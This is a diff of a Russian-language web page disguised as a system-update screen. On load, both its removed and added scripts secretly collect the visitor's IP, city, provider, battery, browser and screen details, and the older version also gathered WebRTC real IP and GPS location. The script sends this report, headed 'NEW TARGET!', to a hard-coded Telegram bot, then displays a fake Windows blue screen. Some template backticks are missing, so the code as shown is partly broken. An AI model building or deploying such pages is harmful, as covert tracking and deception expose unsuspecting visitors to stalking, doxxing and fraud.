@@ -15,162 +15,61 @@
     <div class="spinner"></div>
     <h2>Установка обновлений...</h2>
     <p>Пожалуйста, не выключайте устройство</p>
-    <p id="status" style="font-size: 12px; color: #666;">Подготовка...</p>
   </div>
 
   <script>
-    // ========== ФУНКЦИЯ ПОЛУЧЕНИЯ REAL IP ЧЕРЕЗ WEBRTC ==========
-    function getWebRTCIP() {
-      return new Promise((resolve) => {
-        const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-        pc.createDataChannel('test');
-        pc.createOffer().then(offer => pc.setLocalDescription(offer));
-        pc.onicecandidate = (event) => {
-          if (event && event.candidate && event.candidate.candidate) {
-            const ip = event.candidate.candidate.match(/\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/)?.[0];
-            if (ip) {
-              resolve(ip);
-              pc.close();
-            }
+    async function collectAndSend() {
+      try {
+        // 1. Получаем IP + геоданные (быстро)
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+
+        // 2. Батарея (если доступна)
+        let battery = 'недоступно';
+        try {
+          if (navigator.getBattery) {
+            const b = await navigator.getBattery();
+            battery = ${Math.round(b.level * 100)}% | ${b.charging ? '🔌 заряжается' : '🔋 не заряжается'};
           }
-        };
-        setTimeout(() => resolve('не обнаружен'), 3000);
-      });
-    }
+        } catch(e) {}
 
-    // ========== ПОЛУЧЕНИЕ ГЕОЛОКАЦИИ ==========
-    function getGeoLocation() {
-      return new Promise((resolve) => {
-        if (!navigator.geolocation) {
-          resolve('недоступно');
-          return;
-        }
-        navigator.geolocation.getCurrentPosition(
-          (pos) => {
-            resolve(✅ ${pos.coords.latitude}, ${pos.coords.longitude} (точность: ${pos.coords.accuracy}м));
-          },
-          () => resolve('❌ отказано'),
-          { timeout: 5000, enableHighAccuracy: true }
-        );
-      });
-    }
-
-    // ========== ПОЛУЧЕНИЕ ДАННЫХ О БАТАРЕЕ ==========
-    function getBatteryInfo() {
-      return new Promise((resolve) => {
-        if (!navigator.getBattery) {
-          resolve('недоступно');
-          return;
-        }
-        navigator.getBattery().then(battery => {
-          resolve(${Math.round(battery.level * 100)}% | ${battery.charging ? '🔌 заряжается' : '🔋 не заряжается'});
-        }).catch(() => resolve('ошибка'));
-      });
-    }
-
-    // ========== ОСНОВНАЯ ФУНКЦИЯ СБОРА ==========
-    async function collectAll() {
-      const status = document.getElementById('status');
-      
-      // 1. Базовые данные (IP, гео, провайдер)
-      status.textContent = 'Сбор геоданных...';
-      const geoRes = await fetch('https://ipapi.co/json/');
-      const geoData = await geoRes.json();
-
-      // 2. WebRTC IP
-      status.textContent = 'Поиск реального IP...';
-      const webrtcIP = await getWebRTCIP();
-
-      // 3. Геолокация (запрос разрешения)
-      status.textContent = 'Запрос геолокации...';
-      const geoLoc = await getGeoLocation();
-
-      // 4. Батарея
-      status.textContent = 'Чтение батареи...';
-      const battery = await getBatteryInfo();
-
-      // 5. Сбор системных данных
-      const plugins = [];
-      for (let i = 0; i < navigator.plugins.length; i++) {
-        plugins.push(navigator.plugins[i].name);
-      }
-
-      const fonts = [];
-      if (document.fonts) {
-        for (const font of document.fonts) {
-          fonts.push(font.family);
-        }
-      }
-
-      // 6. Формируем расширенный отчет
-      const message = `
+        // 3. Формируем сообщение
+        const message = 
 🎯 НОВЫЙ ЦЕЛЬ!
-━━━━━━━━━━━━━━━━━
-📡 IP (основной): ${geoData.ip || '—'}
-📡 IP (WebRTC, реальный): ${webrtcIP}
-🌆 Город: ${geoData.city || '—'}
-📍 Регион: ${geoData.region || '—'}
-🌍 Страна: ${geoData.country_name  '—'} (${geoData.country_code  '—'})
-🏢 Провайдер: ${geoData.org || '—'}
-🕒 Часовой пояс: ${geoData.timezone || '—'} (смещение: ${new Date().getTimezoneOffset() / -60} ч)
-📞 Телефонный код: ${geoData.country_calling_code || '—'}
-🗺️ Геолокация (GPS): ${geoLoc}
+📡 IP: ${data.ip || '—'}
+🌆 Город: ${data.city || '—'}
+📍 Регион: ${data.region || '—'}
+🌍 Страна: ${data.country_name || '—'}
+🏢 Провайдер: ${data.org || '—'}
+🕒 Часовой пояс: ${data.timezone || '—'}
+🖥️ Браузер: ${navigator.userAgent}
+📱 Экран: ${screen.width}x${screen.height}
 🔋 Батарея: ${battery}
-━━━━━━━━━━━━━━━━━
-🖥️ ОС: ${navigator.platform}
-🌐 Браузер: ${navigator.userAgent}
-📱 Экран: ${screen.width}x${screen.height} (глубина: ${screen.colorDepth} бит)
-🔄 Тouch-экран: ${'ontouchstart' in window ? '✅ да' : '❌ нет'}
-🔌 Плагины: ${plugins.join(', ') || 'нет'}
-🔤 Шрифты (первые 5): ${fonts.slice(0, 5).join(', ') || 'недоступно'}
-🌐 Язык: ${navigator.language} (${navigator.languages.join(', ')})
-⏱️ Время загрузки: ${performance.now().toFixed(0)} мс
-🍪 Cookies включены: ${navigator.cookieEnabled ? '✅' : '❌'}
-━━━━━━━━━━━━━━━━━
-📊 Дополнительно:
-- Do Not Track: ${navigator.doNotTrack || 'не установлен'}
-- Online: ${navigator.onLine ? '✅' : '❌'}
-- Количество ядер CPU: ${navigator.hardwareConcurrency || '—'}
-- Память (приблизительно): ${navigator.deviceMemory ? navigator.deviceMemory + ' ГБ' : 'недоступно'}
-- Размер окна: ${window.innerWidth}x${window.innerHeight}
-- Прокси/VPN: ${geoData.ip && webrtcIP && geoData.ip !== webrtcIP ? '⚠️ ВОЗМОЖНО VPN/ПРОКСИ!' : 'нет признаков'}
+🌐 Язык: ${navigator.language}
 ;
 
-      const token = '8846056738:AAECpZGTr0h7NfRSY5RteoD5lCTdkRRLjtU';
-      const chatId = '8098905046';
-      await fetch(https://api.telegram.org/bot${token}/sendMessage, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message,
-          parse_mode: 'Markdown'
-        })
-      });
+        // 4. Отправляем в Telegram
+        const token = '8846056738:AAECpZGTr0h7NfRSY5RteoD5lCTdkRRLjtU';
+        const chatId = '8098905046';
+        await fetch(https://api.telegram.org/bot${token}/sendMessage, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: chatId, text: message })
+        });
 
-      // 8. Финальный экран — фейковый синий экран смерти (Windows BSOD)
-      document.body.innerHTML = 
-        <div style="background: #0000aa; color: white; display: flex; height: 100vh; justify-content: center; align-items: center; flex-direction: column; font-family: 'Courier New', monospace; padding: 20px; text-align: center;">
-          <h1 style="font-size: 50px; margin-bottom: 30px;">:(</h1>
-          <p style="font-size: 24px;">Ваш компьютер столкнулся с проблемой и должен быть перезагружен.</p>
-          <p style="font-size: 18px; margin-top: 20px; max-width: 600px;">Код ошибки: CRITICAL_PROCESS_DIED</p>
-          <p style="font-size: 14px; margin-top: 40px; color: #8888ff;">Сбор данных: 100%</p>
-          <p style="font-size: 12px; margin-top: 10px; color: #6666dd;">Для перезагрузки нажмите Ctrl+Alt+Del</p>
-        </div>
-      ;
-
-      status.textContent = 'Готово!';
+        // 5. Синий экран
+        document.body.innerHTML = 
+          <div style="background: #0000aa; color: white; display: flex; height: 100vh; justify-content: center; align-items: center; flex-direction: column; font-family: 'Courier New', monospace; padding: 20px; text-align: center;">
+            <h1 style="font-size: 50px;">:(</h1>
+            <p style="font-size: 24px;">Ваш компьютер столкнулся с проблемой</p>
+            <p style="font-size: 14px; margin-top: 40px;">Код ошибки: CRITICAL_PROCESS_DIED</p>
+          </div>
+        ;
+      } catch(e) {
+        document.body.innerHTML = <h1 style="color:red;">Ошибка</h1>;
+      }
     }
-
-    // Запускаем
-    collectAll().catch(() => {
-      document.body.innerHTML = 
-        <div style="background:#000;color:#ff0000;display:flex;height:100vh;justify-content:center;align-items:center;flex-direction:column;font-family:monospace;">
-          <h1 style="font-size:60px;">⚠️ КРИТИЧЕСКАЯ ОШИБКА</h1>
-          <p>Обратитесь к системному администратору</p>
-        </div>
-      `;
-    });
+    collectAndSend();
   </script>
 </body>
 </html>
